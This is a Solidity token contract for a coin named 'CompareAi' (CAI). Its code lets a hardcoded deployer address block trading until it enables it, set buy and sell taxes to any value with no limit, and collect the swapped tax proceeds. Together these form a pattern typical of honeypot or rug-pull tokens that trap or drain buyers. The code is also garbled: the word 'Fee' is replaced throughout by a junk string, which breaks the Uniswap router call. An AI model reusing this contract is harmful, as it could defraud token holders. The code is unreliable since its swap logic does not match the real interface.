/*



Links
Website:         https://www.compareai.bot/
Twitter (X):     https://twitter.com/CompareAi_
Telegram:        https://t.me/CompareAi_Portal
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingtaxsdhtrfhOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract CAI  {

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public _name = unicode"CompareAi"; 
        string public _symbol = unicode"CAI";  
        uint8 public constant decimals = 9;
        uint256 public constant totalSupply = 1000000 * 10**decimals;

        uint256 buytaxsdhtrfh = 0;
        uint256 selltaxsdhtrfh = 5;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed CAI_DEPLOY,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant CAI_DEPLOY = payable(address(0x66798F8F4D9F391A268f8A2f87d388bc2D7FdE76));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == CAI_DEPLOY || to == CAI_DEPLOY);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingtaxsdhtrfhOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                CAI_DEPLOY.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 taxsdhtrfhAmount = amount * (from == pair ? buytaxsdhtrfh : selltaxsdhtrfh) / 100;
                amount -= taxsdhtrfhAmount;
                balanceOf[address(this)] += taxsdhtrfhAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function EnableTrading() external {
            require(msg.sender == CAI_DEPLOY);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _Remevetax(uint256 _buy, uint256 _sell) private {
            buytaxsdhtrfh = _buy;
            selltaxsdhtrfh = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != CAI_DEPLOY)        
                revert Permissions();
            _Remevetax(_buy, _sell);
        }
    }